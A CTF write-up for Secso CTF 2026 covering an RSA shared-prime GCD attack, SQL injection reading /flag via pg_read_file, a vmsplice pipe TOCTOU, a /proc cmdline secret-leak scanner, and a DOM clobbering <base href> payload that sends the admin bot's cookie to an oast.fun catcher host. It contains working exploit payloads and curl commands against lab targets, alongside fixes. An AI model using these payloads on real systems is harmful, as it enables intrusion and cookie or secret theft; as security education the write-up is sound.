---
title: "Secso CTF 2026 Writeup"
description: "Writeup for Secso CTF 2026 challenges, covering RSA common factor attack, SQL injection to arbitrary file read, vmsplice TOCTOU commit-reveal break, /proc cmdline secret leak, and DOM clobbering cookie exfiltration."
date: 2026-07-05T19:40:00+0800
lastmod: 2026-07-06T00:30:00+0800
tag: "Secso, Writeup, CTF, Crypto, Web, Misc"
lang: en-US
---

# Introduction

Secso CTF 2026. This is the writeup for what I solved, mostly crypto and web with two kernel-ish misc challenges thrown in.

Honestly I almost missed this one. A friend dragged me in quite late, the competition was nearly over by the time I started. But I am glad I joined. It was a fun one.

> Event Website: [Secso](https://ctf.secso.cc/)

| Challenge | Category | Description |
| :--- | :---: | :--- |
| Shared Primes | Crypto | RSA keyserver reused a prime across moduli |
| United Pigeon Service | Web | Flask + PostgreSQL app with SQL injection |
| spot | Misc | Commit-reveal coin flip with vmsplice TOCTOU |
| sudo but good | Misc | Setuid binary leaks secret via `/proc/<pid>/cmdline` |
| whatsNew | Web | DOM clobbering + `<base>` exfiltration via filter bypass |

![Secso CTF 2026](./images/SCONES%20CTF.png)

## Shared Primes

**Category**: Crypto
**Description**: `nc chal.secso.cc 5001`. A keyserver hands out RSA public keys and reuses a prime.

### Challenge overview

The server gives you 7 RSA public keys `(n0..n6, e=6767)` and a ciphertext `c` encrypted under `n0`. The challenge says the keyserver was "lazy and reused a prime", and exactly one other modulus shares a prime factor with `n0`. One GCD breaks the key.

```
=== welcome to crypto class! here are today's RSA public keys ===
e = 6767
n0 = 1233349...42599
n1 = 1930440...15829
n2 = 1700851...44291
n3 = 1545411...03089
n4 = 1829579...28919
n5 = 3038950...35449
n6 = 3048088...23289

the flag was encrypted under key 0:
c = 1119605...3664

our keyserver was lazy and reused a prime gg let's break key 0 together >:)

step 1: exactly one other key shares a prime with key 0
compute the gcd of n0 with each other mods and give me that shared prime p.
```

### Steps to solve

#### 1. Find the shared prime

`n = p * q`. If two moduli share a prime factor `p`, then `GCD(n_i, n_j) = p`. I computed GCD of `n0` against each other modulus:

```python
from math import gcd

for i, ni in enumerate([n1, n2, n3, n4, n5, n6], 1):
    g = gcd(n0, ni)
    if g > 1:
        p = g
        print(f"shared with n{i}")
        break
```

```
shared with n2
p = 105363005287200751110068718256991802236601170120789
```

#### 2. Factor n0

```python
q0 = n0 // p
# q0 = 117057150757182985368056438235423953197003949737291
```

#### 3. Compute the private key

```python
phi = (p - 1) * (q0 - 1)
d = pow(e, -1, phi)
```

#### 4. Decrypt

```python
from Crypto.Util.number import long_to_bytes

m = pow(c, d, n0)
flag = long_to_bytes(m).decode()
```

### Flag

```
SCONES{s1x_s3v3n_sh4r3d_pr1m35}
```

### Key takeaways

The RSA common factor attack needs no fancy factoring. GCD is polynomial time, instant on any reasonable modulus size. The flaw is purely on the keyserver side: lazy prime generation with no uniqueness check across issued keys. A single `gcd` between any two moduli compromises both, instantly.

RSA itself is fine. The implementation was not.

---

## United Pigeon Service

**Category**: Web
**Description**: A Flask + PostgreSQL app for managing pigeon cargo manifests. "Please do not leave seeds everywhere. The pigeons will find them and we're going to have a server error. Especially not in the DB."

### Challenge overview

Two SQL injection points, both because the app interpolates user input into queries with raw f-strings. PostgreSQL runs as the `postgres` superuser, so `pg_read_file()` can read anything on the host, including the flag at `/flag`.

The flag is at `/flag` on the container filesystem. The Dockerfile does `COPY ./flag /`, so the flag file lives at root, not in the database. The "Especially not in the DB" hint is a nudge toward the SQLi to `pg_read_file` chain. It is not a literal statement about where the flag is.

### Source code

**`/login` (POST)**. Username goes straight into the WHERE clause:

```python
cursor.execute(f"""
    SELECT username FROM personnel
    WHERE username='{username}' AND pwd='{md5_hash}'
""")
```

**`/api/manifest` (POST, JWT-protected)**. The search keyword is interpolated into a LIKE:

```python
cursor.execute(f"""
    SELECT source_location, destination_location, cargo_description,
           op_status AS status_indicator
    FROM cargo_manifest
    WHERE cargo_description like '%{keyword}%'
""")
```

### Steps to solve

#### 1. Bypass login

Username `admin'--` comments out the password check:

```sql
SELECT username FROM personnel
WHERE username='admin'--' AND pwd='...'
```

```bash
curl -X POST http://chal.instancer.secso.cc:{PORT}/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"anything"}'
```

Server returns a valid JWT.

#### 2. UNION injection to read `/flag`

The manifest query returns four columns. I put `pg_read_file('/flag')` in the third column, which maps to `cargo_description` in the JSON response:

```
POST /api/manifest?q=' UNION SELECT 'a','b',pg_read_file('/flag'),'d' --
```

Resulting query:

```sql
SELECT source_location, destination_location, cargo_description,
       op_status AS status_indicator
FROM cargo_manifest
WHERE cargo_description like '%' UNION SELECT 'a','b',pg_read_file('/flag'),'d' --%'
```

#### 3. Pull the flag

The injected row has `source_location='a'` and `destination_location='b'`, so it is easy to spot. The `cargo_description` field contains the flag.

### Flag

```
SCONES{the_p1j0ns_4re_n0t_1n_the_p1ge0nh0l3}
```

### Key takeaways

Both injection points exist because of f-string interpolation. Parameterised queries would have killed this chain entirely: `cursor.execute("... WHERE x = %s", (value,))`.

The login bypass is interesting because the app does hash the password with MD5. It doesn't matter. Once the username field is injectable, `admin'--` comments the password check out entirely. Hashing the input you never check is a waste of CPU.

PostgreSQL superuser in a CTF container is a gift. `pg_read_file()` reads anything the `postgres` user can access, and in this container that was everything, including `/flag`. One injection, one file read, done.

---

## spot

**Category**: Misc
**Difficulty**: Hard
**Description**: "Due to budget constraints we've had to sliiiightly reduce the chance of winning a spot prize. However, we've implemented a new system that makes it 100% impossible for us to rig the randomness. It's also literally unhackable."

### Challenge overview

A commit-reveal coin flip. The privileged process (the "house", running as `admin`) can read `/flag`. Our unprivileged client runs as `ctf`. We exchange random values over two pipes and win if `r1 ^ r2 == 67`. The house reveals `r2` only after seeing our commitment to `r1`, so in theory we cannot steer the result.

The handout does a setuid sandbox:

```
/app/runner      -r-sr-xr-x  admin admin   (setuid admin)
/app/main.py     owned by admin            (the "house")
/flag            -r--------  admin         (only admin can read it)
~/sample_client.py                         (a reference client)
~/runner -> /app/runner
```

`runner.c` forks two children connected by two pipes:
- main (`/app/main.py`) runs as admin with pipes on fds 3 (read) and 4 (write). Keeps privileges, so it can `open("/flag")`.
- client (a path we choose) runs as ctf after `setresuid` drops privs, with the other ends of the pipes on fds 3/4.

The MOTD literally invites us to bring our own client:

```
To use the system, run `./runner sample_client.py`.
If you don't trust our client you're welcome to implement your own :)
```

### The protocol (`main.py`)

```python
# ensure r1 has been committed
while get_num_bytes_in_pipe(fd_read) < 64:        # (A) wait for commit
    ...
r2 = secrets.token_bytes(16)
f_write.write(r2.hex() + "\n"); f_write.flush()   # (B) reveal r2

while get_num_bytes_in_pipe(fd_read) < 128:       # (C) wait for reveal
    ...
data = bytes.fromhex(f_read.read(128))            # (D) read commit+reveal
commit, reveal = data[:32], data[32:]
if hashlib.sha256(reveal).digest() != commit:     # (E) verify binding
    raise ValueError("Reveal does not match commitment")
r1 = reveal[:16]
r = int.from_bytes(r1) ^ int.from_bytes(r2)       # (F) result
if r == 67:
    print(... open("/flag").read())
```

`get_num_bytes_in_pipe` uses `FIONREAD` ioctl. It only reports the byte count in the pipe, not the actual bytes.

Everything is ASCII hex, so the pipe holds 128 hex chars total: 64 for the commit (`sha256(r1+salt).hexdigest()`), 64 for the reveal (`(r1+salt).hex()`).

### The bug: check the count, read the bytes later (TOCTOU)

The order of operations on `fd_read`:

1. (A) house checks `FIONREAD >= 64` to confirm "the commit is here"
2. (B) house reveals `r2`
3. (C) house checks `FIONREAD >= 128` to confirm "the reveal is here"
4. (D) house finally reads the 128 bytes and verifies them

Between (A)/(C) and (D), the house only ever looks at the length of the pipe, never the content. If we can change the content queued in the pipe after step (B) but before step (D), we win. We get to pick `r1` knowing `r2`.

How do you change bytes you already wrote to a pipe? An ordinary `write()` copies your data into a kernel pipe buffer. But the hint points straight at the trick:

> Hint 1: how can we change the data we write after the fact? there is a syscall that will help you a lot here.

That syscall is `vmsplice(2)` with `SPLICE_F_GIFT`.

### vmsplice + SPLICE_F_GIFT

A pipe is a set of reference-counted pointers to pages of kernel memory. With `SPLICE_F_GIFT`, `vmsplice` does not copy. It puts a reference to our page into the pipe. A consumer that later `read()`s the pipe copies out whatever is in that page at read time. If we keep the page mapped and mutate it, the reader sees the new bytes.

5-line local proof:

```python
buf = mmap.mmap(-1, 4096, prot=PROT_READ|PROT_WRITE); buf[:64] = b"A"*64
r, w = os.pipe()
vmsplice(w, iovec(addr_of(buf), 64), 1, SPLICE_F_GIFT)   # gift "AAAA..."
buf[:64] = b"B"*64                                       # mutate AFTER splice
os.read(r, 64)                                           # -> b"BBBB..."  (!)
```

Read returns `BBBB...`, not `AAAA...`. The pipe held a pointer to our page, not a copy.

### Steps to solve

#### 1. Gift the commit, learn r2

`mmap` a page-aligned buffer holding a valid `(commit, reveal)` pair. Gift the first 64 bytes (the commit half) into fd 4 via `vmsplice(SPLICE_F_GIFT)`. The house sees `FIONREAD >= 64` and reveals `r2`.

#### 2. Read r2, compute the winning r1

Receive `r2` on fd 3. Set `r1 = r2 ^ 67` (byte-wise XOR, result lands on 67). Recompute a consistent pair: `reveal = r1 + salt`, `commit = sha256(reveal)`.

#### 3. Overwrite the gifted page in place

Mutate the same `mmap`'d page: `buf[0:64] = commit_hex`, `buf[64:128] = reveal_hex`. The pipe still references this page. The commit half already sitting in the pipe now reflects the new `r1`.

#### 4. Gift the reveal, win

`vmsplice` the second 64 bytes (the reveal half) into fd 4. The house sees `FIONREAD >= 128`, reads all 128 bytes, verifies `sha256(reveal) == commit` (it matches, we recomputed it), computes `r = r1 ^ r2 = 67`, and prints the flag.

```
client                                     house (main.py)
------                                     ---------------
mmap a page: [commit_hex(64)][reveal_hex(64)]   (some valid initial pair)

(1) vmsplice commit  (bytes 0..63)  ----->  (A) FIONREAD >= 64   ✓
                                            (B) send r2
(2) read r2  <-----------------------------
(3) r1 = r2 ^ 67 ; commit = sha256(r1+salt)
(4) OVERWRITE the gifted page in place:
       buf[0:64]   = commit_hex
       buf[64:128] = (r1+salt).hex
(5) vmsplice reveal  (bytes 64..127) ----->  (C) FIONREAD >= 128  ✓
                                            (D) read 128 bytes  <-- sees our
                                                rewritten consistent pair
                                            (E) sha256(reveal)==commit  ✓
                                            (F) r = r1 ^ r2 == 67  -> FLAG
```

#### 5. Why this is deterministic, not a flaky race

The house cannot reach the read (D) until it observes 128 bytes. The 128th byte only exists after our step (5). We do the page rewrite (4) before step (5). So by the time the house is allowed to read, both halves of the page are already the final, consistent `(commit, reveal)` pair.

There is no timing window to lose. It landed on `67` on the first attempt.

#### Gotchas

- `runner` execs the client with an empty environment and on fd 3/4. Use those fds directly. `os.fdopen(3, "r")` for reading `r2`; raw `vmsplice` into fd 4 for writing.
- `SPLICE_F_GIFT` wants page-aligned source memory. An `mmap` page satisfies that. Gift 64-byte slices out of the same page (length need not be a full page; the base is aligned).
- Seed the page with a valid commit/reveal pair up front so nothing is ever malformed even if read early. It gets overwritten before the real read.
- Keep the page mapped (`time.sleep`) until the house has finished reading.

### Flag

```
SCONES{n3verm1nd_we're_br0ke_hav3_t#is_fl@g_in$tead}
```

### Key takeaways

A commitment is only binding if the value is captured at commit time. Here the verifier trusted `FIONREAD` length as a proxy for "the data is finalised and immutable". It isn't. Pipe contents backed by gifted pages can still change. Same family as CVE-2022-0847 "Dirty Pipe".

`vmsplice(SPLICE_F_GIFT)` is a zero-copy footgun. It inserts references to user pages into the pipe instead of copying. Useful for performance, dangerous for security. Any subsequent mutation of those pages is visible to the reader.

The fix is obvious: actually `read()` the commit bytes into the verifier's own buffer before sending `r2`. Once copied into the reader's memory, later page mutations cannot affect it.

---

## sudo but good

**Category**: Misc
**Description**: SSH access as `ctf`. A setuid-`admin` binary `/app/sudobutgood` runs an arbitrary command for us if we supply the right password.

### Challenge overview

```
-r-sr-xr-x admin admin  /app/sudobutgood        # setuid admin
-r-------- admin admin  /app/sudobutgood_pass   # the secret
-r-------- admin admin  /flag
```

The binary reads the secret from `/app/sudobutgood_pass`, hashes it, hashes our input, compares. If they match, it drops to `admin` privileges and runs our command, which can read `/flag`.

### The bug: secret on the command line

`get_hash()` shells out to compute SHA-256, passing the secret password as a command-line argument:

```c
char *args[] = {
    "/bin/sh", "-c",
    "printf \"%s\" \"$1\" | /usr/bin/sha256sum",
    "sh",
    (char *)input,   // <-- secret password ends up in argv
    NULL
};
execve(args[0], args, NULL);
```

When `main()` hashes the secret to compare against our guess, it calls `get_hash(secret_pass, ...)`, spawning:

```
/bin/sh -c 'printf "%s" "$1" | /usr/bin/sha256sum' sh <SECRET_PASSWORD>
```

`/proc/<pid>/cmdline` is world-readable, even for children of the setuid process. Confirmed: `-r--r--r-- root root /proc/PID/cmdline`. Only `environ` and `mem` require ptrace access. The secret leaks through the child shell's argv.

The "rewriting in Rust" line in the challenge flavour text is a red herring. This is a classic secret-on-the-command-line leak.

### Steps to solve

#### 1. Race the short-lived hashing child

The secret-hashing child is short-lived, so I raced it. Run a tight `/proc` scanner in one session, while a launcher loop invokes the binary repeatedly in another. The scanner matches the `printf ... sha256sum` shell and prints `argv[4]` (the secret), ignoring my dummy input `x`.

The box has no `gcc` but ships `python3`, so the scanner is Python:

```python
import glob, time

t = time.time()
while time.time() - t < 120:
    for c in glob.glob("/proc/[0-9]*/cmdline"):
        try:
            d = open(c, "rb").read()
        except:
            continue
        if b"sha256sum" in d:
            p = d.split(b"\0")
            if len(p) >= 5 and b"printf" in p[2] and p[4] != b"x":
                print(p[4].decode())
                break
    else:
        continue
    break
```

#### 2. Leak the secret

Scanner in one SSH session, launcher loop (`while true; do echo x | /app/sudobutgood true; done`) in another. The scanner catches the secret within seconds:

```
secret = i_want_to_boil_rustaceans
```

#### 3. Authenticate and read the flag

```
echo 'i_want_to_boil_rustaceans' | /app/sudobutgood 'cat /flag'
```

### Flag

```
SCONES{ju$t_d0n't_writ3_bugs_ezpz}
```

### Key takeaways

Never pass secrets as command-line arguments. `/proc/<pid>/cmdline` is world-readable. Use environment variables (those need ptrace), file descriptors, or a config file with restrictive permissions.

Setuid children still leak. The child shell inherits the setuid parent's exec, but `cmdline` is owned by root and world-readable regardless of the parent's privileges. Running setuid doesn't make your children invisible.

Racing short-lived processes is practical. A tight `/proc` scanner plus a launcher loop reliably catches millisecond-lived children. The window is small but the retry cost is near zero.

One gotcha: do not `pkill -f scan.py` in the remote one-liner. The SSH command line itself contains `scan.py`, so it self-terminates. Use `kill -9 -1` to clean your own procs.

---

## whatsNew

**Category**: Web
**Difficulty**: Hard
**Description**: A beta-test blog service where the admin bot visits `/admin/preview` to review the latest posts, carrying the flag as a cookie. Goal: steal the admin's cookie.

Two hints:
1. *"Admin uses `window.whatsNew` global property to view all new posts at once"*
2. *"Take a close look at what admin uses to redirect"*

### Challenge overview

Posts live in 4 categories (Tech / Travel / Food / Lifestyle). Only the `description` field is stored, and `/admin/preview` renders it raw via `raw()`. No escaping. The page also loads `updates.js`, which reads config from a `window.whatsNew` global. That is the DOM clobbering target hint 1 was pointing at.

### Source code

**`POST /category/:slug/new`**. Only `description` is decoded and stored, no escaping applied:

```js
router.post('/category/:slug/new', (req, res) => {
  const decodedDescription = decodeHtml(req.body.description)
  if (isSuspicious(decodedDescription))
    return res.status(400).send('suspicious')
  req.body.description = decodedDescription
  store.addPost(category.slug, req.body)
  res.redirect(`/category/${category.slug}`)
})
```

**`renderPost`**. The description lands unescaped via `raw()`:

```js
// category.renderPost(post)
`<div class="post-description">${raw(post.description)}</div>`
// where raw() = String(value ?? '')  --  no escaping
```

There is a 200-character limit on the stored description. But `/admin/preview` renders the latest post of each of the 4 categories concatenated, so you get ~800 chars of attacker HTML across all categories combined.

**`updates.js`** (loaded by `/admin/preview`). The gadget:

```js
// /public/static/updates.js  (loaded by /admin/preview)
window.whatsNew = window.whatsNew || {
  mode: 'grid',
  category: 'all',
  panel: '#latest-posts',
  label: 'Current posts',
  autoReview: false,
  next: '/admin/preview',
};

// all keys must be non-null; panel must equal '#latest-posts'
// autoReview must be 'true' or '1'

(function () {
  const next = window.whatsNew.next
  const rawNext = next.getAttribute('href')
  if (typeof rawNext !== 'string' || !rawNext.startsWith('/admin/'))
    return fail('invalid displaying config')
  setTimeout(() => {
    const target = new URL(next.href)
    target.searchParams.set('cookie', document.cookie)
    location.assign(target.href) // <- redirect w/ cookie
  }, 1500)
})()
```

### Vulnerability chain

#### 1. The filter bypass: semicolon-less numeric entities

`src/filter.js` has a heavy blocklist. `script`, `whatsnew`, `next`, `panel`, `admin`, `form`, `input`, `//`, `http:`, `:`, `(`, `)`, `[`, `]`, `{`, `}`, `+`, `${`, `eval`, `location`, `window`. Plus regexes for `on...` event handlers and `%xx`.

But the input is first passed through `decodeHtml`:

```js
function decodeHtml(value) {
  return String(value ?? '').replace(/&(#x[0-9a-f]+|#\d+|[a-z]+);/gi, (match, entity) => {
    if (entity[0] === '#') { /* numeric: codePoint via parseInt */ }
    return NAMED_ENTITIES[entity.toLowerCase()] || match
  })
}
```

The regex requires a trailing `;`. Numeric entities written without a semicolon, like `&#119`, do not match. `decodeHtml` leaves them intact, and `isSuspicious` never sees the blocked token.

But the HTML parser in the browser decodes `&#119` to `w` inside attribute values even without a trailing semicolon:

| Stored (filter sees) | Browser decodes to |
|---|---|
| `&#119hatsNew` | `whatsNew` |
| `&#110ext` | `next` |
| `&#112anel` | `panel` |
| `&#35latest-posts` | `#latest-posts` |
| `&#97dmin` | `admin` |

Only one letter per blocked token needs encoding to break the `.includes()` substring match. The payload stays tiny.

#### 2. DOM clobbering `window.whatsNew`

Multiple elements sharing `id=whatsNew` make `window.whatsNew` an `HTMLCollection`. Named property access on a collection returns the member with matching `name`/`id`, so:

```html
<a id=whatsNew name=mode>
<a id=whatsNew name=category>
<a id=whatsNew name=label>
<a id=whatsNew name=panel     value="#latest-posts">
<a id=whatsNew name=autoReview value=1>
<a id=whatsNew name=next      href="/admin/">
```

satisfy every `window.whatsNew.X` lookup in `updates.js`. `<a>` because `form`/`input`/`iframe` etc. are blocked, but the anchor tag is not.

#### 3. The redirect trick: `<base href>`

The redirect logic does two separate reads on the same `next` element:

```js
rawNext = next.getAttribute('href') // literal attribute string
// ...
target = new URL(next.href) // IDL resolved absolute URL
location.assign(target.href)
```

For a normal `<a href="/admin/">`, both relate to the same origin, so no exfiltration. I needed `getAttribute('href')` to start with `/admin/` to pass the check, while `next.href` (resolved) is cross-origin.

The fix is an injected `<base href="http://ATTACKER/">` tag. `base` is not in the blocklist. `form` and `input` are, `base` isn't. A root-relative `href="/admin/..."` then resolves against the attacker base URL:

- `getAttribute('href')` = `/admin/` (literal, starts with `/admin/` ✓)
- `next.href` = `http://ATTACKER/admin/` (cross-origin ✓)

The `?cookie=document.cookie` is appended and the browser navigates cross-origin to the attacker, leaking the flag cookie.

`<base>`'s own `href` value (`http://ATTACKER/`) contains blocked tokens (`http:`, `//`, `:`). Same semicolon-less entity trick handles them. Only the blocked characters need encoding, the hostname stays literal:

```
http&#58&#47&#47<d90...oast.fun>&#47
```

#### 4. Beating the 200-character limit

`/admin/preview` renders the latest post of each of the 4 categories. I split the payload across 4 `description` fields, each ≤200 chars:

| Category | Payload fragment |
|---|---|
| tech      | `<base href="http&#58&#47&#47HOST&#47"><a id=… name=next href="/&#97dmin/">` |
| travel    | `<a id=… name=mode><a id=… name=category><a id=… name=label>` |
| food      | `<a id=… name=panel value="&#35latest-posts">` |
| lifestyle | `<a id=… name=autoReview value=1>` |

`<base>` has to go in the tech category because `latestPosts()` iterates categories in order `[tech, travel, food, lifestyle]` and `<base>` only affects anchors parsed after it.

### Steps to solve

#### 1. Prepare the payload

Encode any blocked tokens with semicolon-less numeric entities. Build the 4 fragments, one per category.

**tech**
```html
<base href="http&#58&#47&#47d90hgn2ntn903tu615p0shdzkcw4bchtd.oast.fun&#47"><a id=&#119hatsNew name=&#110ext href="/&#97dmin/">
```

**travel**
```html
<a id=&#119hatsNew name=&#109ode><a id=&#119hatsNew name=&#99ategory><a id=&#119hatsNew name=&#108abel>
```

**food**
```html
<a id=&#119hatsNew name=&#112anel value="&#35latest-posts">
```

**lifestyle**
```html
<a id=&#119hatsNew name=&#97utoReview value=1>
```

#### 2. Post each fragment to its category

```bash
curl -X POST http://chal.instancer.secso.cc:{PORT}/category/tech/new \
  -d "title=tech&author=beta&description=<base href=\"http&#58&#47&#47...oast.fun&#47\"><a id=&#119hatsNew name=&#110ext href=\"/&#97dmin/\">"
# repeat for travel, food, lifestyle
```

#### 3. Trigger the admin bot

```bash
curl -X POST http://chal.instancer.secso.cc:{PORT}/report
```

Bot visits `/admin/preview`. `updates.js` runs, reads the DOM-clobbered `window.whatsNew`, sees `autoReview=1`, and 1.5 seconds later:

```
GET /admin/?cookie=token%3DSCONES%7BG4dg3t_D0M_Cl0663r1nggg%21%7D HTTP/1.1
Host: d90…oast.fun
```

URL-decoded cookie:

```
token=SCONES{G4dg3t_D0M_Cl0663r1nggg!}
```

#### 4. Exfiltration

I used interactsh (`*.oast.fun`) as the OOB catcher. Any path on the unique subdomain is logged, which sidesteps the root-relative `/admin/` discarding any path component. A webhook.site token-in-path catcher would lose the token.

### Flag

```
SCONES{G4dg3t_D0M_Cl0663r1nggg!}
```

### Key takeaways

Custom HTML entity decoders are a problem. `decodeHtml` required a trailing `;` but the HTML5 parser decodes numeric entities without one. Don't write custom entity decoders. Use a vetted sanitizer like DOMPurify.

`window.whatsNew` sourced from a JS global gets clobbered by `id` collisions. Multiple elements sharing an `id` form an `HTMLCollection` with named property access. Freeze the global, or read from a closed-over `const`.

The interesting trick is the `getAttribute` vs `.href` discrepancy. A `<base href>` injection makes the literal attribute string pass same-origin checks while the resolved absolute URL is cross-origin. Validate redirect targets against an exact allowlist, never a user-influenceable absolute URL.

`<base>` is a forgotten injection sink. Blocklists tend to target `script`, `iframe`, `object`. `base` gets left open, and a single tag silently retargets every root-relative URL on the page.

---

## Thanks

That's what I solved at Secso CTF 2026. A bit of everything: an RSA implementation flaw, a classic SQL injection chain, a Linux pipe TOCTOU, a `/proc` secret leak, and a DOM clobbering cookie exfil. Decent variety for a weekend.